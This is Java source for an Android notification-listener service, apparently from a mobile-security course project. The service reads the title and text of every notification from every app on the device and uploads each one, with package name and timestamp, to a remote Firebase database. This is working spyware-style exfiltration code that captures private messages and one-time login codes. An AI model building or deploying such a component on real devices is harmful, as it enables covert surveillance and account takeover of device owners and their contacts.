package com.example.mobilesecurity_finalproject;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

/**
 * NLService extends NotificationListenerService to capture notifications and store them in Firebase.
 * It also supports handling commands to clear notifications and list active notifications.
 */
public class NLService extends NotificationListenerService {

    private String TAG = "NLService";
    private DatabaseReference databaseReference;

    private static boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();

        // Initialize Firebase
        databaseReference = FirebaseDatabase.getInstance().getReference("notifications");

        // Set service as running
        if (!isRunning) {
            isRunning = true;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
    }

    //set status of isRunning
    public static void setRunning(boolean value){
        isRunning = value;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // Mark service as running
        if (!isRunning) {
            Log.d(TAG, "Creating persistent notification!");
            isRunning = true;
        }

        // Extract notification details
        Notification newNot = sbn.getNotification();
        String packageName = sbn.getPackageName();
        String title = "";
        String text = "";

        // Extract title and text from notification
        if (newNot.extras != null) {
            title = newNot.extras.getString(Notification.EXTRA_TITLE);
            CharSequence csText = newNot.extras.getCharSequence(Notification.EXTRA_TEXT);
            text = csText != null ? csText.toString() : "";
        }
        // Extract timestamp
        long timestamp = newNot.when;

        // Upload notification details to Firebase except our notification...
        NotificationData notificationData = new NotificationData(packageName, title, text, timestamp);
        if (!text.equals("Collecting notifications in background...")) {
            databaseReference.push().setValue(notificationData);
        }
    }
}
